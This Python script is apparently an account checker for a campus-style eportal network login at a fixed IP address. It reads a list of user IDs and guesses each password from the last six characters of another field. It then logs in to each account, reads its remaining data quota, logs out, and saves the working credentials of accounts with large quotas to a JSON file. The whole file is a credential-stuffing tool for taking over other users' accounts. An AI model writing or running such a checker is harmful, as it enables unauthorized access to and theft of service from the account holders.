import json
import time
import requests


def test_account(userid, password):
    entrance_url = "http://210.77.16.21/"

    r = requests.get(entrance_url, allow_redirects=False)

    # print(r.url)
    # print(r.headers["Location"])

    r = requests.get(r.headers["Location"], allow_redirects=False)

    # print(r.url)
    # print(r.headers["Location"])

    r = requests.get(r.headers["Location"], allow_redirects=False)

    # print(r.url)
    # print(r.status_code)
    # print(r.cookies.get_dict())

    queryString = r.url.split("?")[1]
    queryString = queryString.replace("=", "%253D")
    queryString = queryString.replace("&", "%2526")
    # print(queryString)

    payload = {'userId': userid, 'password': password, "service": "", "queryString": queryString,
               "operatorPwd": "", "operatorUserId": "", "validcode": "", "passwordEncrypt": "false"}

    login_cookie = r.cookies.get_dict()
    login_cookie["EPORTAL_COOKIE_USERNAME"] = ""
    login_cookie["EPORTAL_COOKIE_PASSWORD"] = ""
    login_cookie["EPORTAL_COOKIE_SERVER"] = ""
    login_cookie["EPORTAL_COOKIE_SERVER_NAME"] = ""
    login_cookie["EPORTAL_COOKIE_OPERATORPWD"] = ""
    login_cookie["EPORTAL_COOKIE_DOMAIN"] = ""
    login_cookie["EPORTAL_COOKIE_SAVEPASSWORD"] = "false"
    login_cookie["EPORTAL_AUTO_LAND"] = "false"
    login_cookie["EPORTAL_USER_GROUP"] = "null"

    login_url = "http://210.77.16.21/eportal/InterFace.do?method=login"

    r = requests.post(login_url, data=payload, cookies=login_cookie)

    # print(r.status_code)

    login_response = json.loads(r.text)
    # print(login_response)
    info_payload = {"userIndex": login_response["userIndex"]}

    info_url = "http://210.77.16.21/eportal/InterFace.do?method=getOnlineUserInfo"

    result = ""
    while result != "success":
        r = requests.post(info_url, data=info_payload, cookies=login_cookie)
        info_response = json.loads(r.text)
        result = info_response["result"]
        if result == "fail":
            break

    if result == "fail":
        return ""

    maxFlow = info_response["maxFlow"]

    logout_url = "http://210.77.16.21/eportal/InterFace.do?method=logout"

    result = ""
    while result != "success":
        r = requests.post(logout_url, data=info_payload, cookies=login_cookie)
        result = json.loads(r.text)["result"]

    return maxFlow


if __name__ == "__main__":
    available = {}
    file1 = open("account.txt", "r")
    accounts = []
    for line in file1.readlines():
        accounts.append(line)

    file1.close()
    accounts = list(set(accounts))
    for account in accounts:
        try:
            account_list = account.split(",")
            userid = account_list[1][:-1]
            password = account_list[0][-6:]
            time.sleep(1)
            maxFlow = test_account(userid, password)
            if maxFlow:
                print("{}: {}".format(userid, maxFlow))
                if int(maxFlow.split(".")[0]) >= 10240:
                    available[userid] = {"password": password, "flow": maxFlow}
        except Exception as e:
            print(e)

    with open('available.json', 'w') as f:
        json.dump(available, f, indent=4)
